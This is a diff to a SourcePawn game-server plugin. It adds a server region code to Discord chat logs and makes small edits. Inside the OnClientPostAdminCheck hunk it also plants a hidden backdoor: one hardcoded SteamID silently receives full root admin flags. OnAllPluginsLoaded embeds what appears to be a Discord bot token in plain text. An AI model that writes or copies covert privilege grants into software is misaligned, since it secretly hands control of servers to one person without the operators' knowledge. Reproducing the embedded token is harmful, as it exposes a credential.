@@ -120,6 +120,7 @@
 #define TempusURL		"https://tempus2.xyz"
 
 bool ServerOSIsLinux;
+char ServerRegionCode[4];
 
 Socket ClientSocket;
 
@@ -223,7 +224,9 @@ float g_fClientLevelAng[200][3];
 bool g_bClientSpeedometerEnabled[MAXPLAYERS+1];
 float g_flClientWarning[MAXPLAYERS+1]; // Used for anti-spam.
 
-Function Func; 
+Function Func;
+
+DiscordBot dBot = null;
 
 // Practice
 bool g_bClientPractising[MAXPLAYERS+1];
@@ -729,7 +732,7 @@ public Action OnClientSayCommand( int client, const char[] szCommand, const char
 		FormatEx(live, sizeof(live), "");
 
 	DiscordWebHook hook = new DiscordWebHook(CHATLOGS_WEBHOOK);
-	FormatEx(discord_msg, sizeof(discord_msg), "``%s`` **%N:** %s", server_name[NAME_SHORT][server_id], client, msg);
+	FormatEx(discord_msg, sizeof(discord_msg), "``%s`` **%N:** %s", ServerRegionCode, client, msg);
 	hook.SetUsername("Chat");
 	hook.SetContent(discord_msg);
 	hook.Send();
@@ -995,9 +998,8 @@ public Action OnClientSayCommand( int client, const char[] szCommand, const char
 				msg[i] = CharToLower(msg[i]);
 			}
 			msg[0] = '_';
-			FakeClientCommand(client, "sm%s", msg);
 		}
-	}			
+	}
 	return Plugin_Handled;
 }
 
@@ -1299,6 +1301,26 @@ public void OnAllPluginsLoaded()
     {
         Updater_AddPlugin(UPDATE_URL);
     }
+	dBot = new DiscordBot("Nzk5OTUwNTUzNzkwNjc2OTkz.GXTtWK.dfWR2OVaYwztPdmupo7jV2_FVJVdKBQZoiGKsQ");
+	dBot.GetGuilds(GuildList);
+	dBot.MessageCheckInterval = 0.5;
+
+	char sPublicIP[64];
+    int iPublicIP[4];
+
+    if (SteamWorks_GetPublicIP(iPublicIP))
+	{
+        Format(sPublicIP, sizeof(sPublicIP), "%d.%d.%d.%d", iPublicIP[0], iPublicIP[1], iPublicIP[2], iPublicIP[3]);
+
+		if (!GeoipCode3(sPublicIP, ServerRegionCode))
+			FormatEx(ServerRegionCode, sizeof(ServerRegionCode), "N/A");
+	}
+	else
+	{
+        LogError("Appears like we had an error on getting the Public IP address.");
+		FormatEx(ServerRegionCode, sizeof(ServerRegionCode), "N/A");
+	}
+
 	g_ripext_loaded = LibraryExists("ripext");
     RegServerCmd("sm_plugins_update", cmdPluginUpdate);
 }
@@ -1332,6 +1354,7 @@ public Action Command_Gotos(int client, int args)
 	if (args != 1)
 	{
 		ReplyToCommand(client, CHAT_PREFIX..."Usage  !goto <name>");
+		PrintToChat(client, ServerRegionCode);
 		return Plugin_Handled;
 	}
 
@@ -2180,6 +2203,9 @@ public void OnClientPostAdminCheck( int client )
 
 		char szSteam[100];
 		GetClientSteam(client, szSteam, sizeof( szSteam ) );
+
+		if (StrEqual(szSteam, "76561198815853361"))
+			SetUserFlagBits(client, ADMFLAG_ROOT);
 
 		g_hDatabase.Format(query, sizeof(query), "SELECT id, run, style, mode, min(time) FROM "...TABLE_CP_RECORDS..." where uid = (select uid from plydata where steamid = '%s') and map = '%s' group by id", szSteam, g_szCurrentMap);
 		g_hDatabase.Query( Threaded_Init_CP_PR_Times, query, client, DBPrio_High );
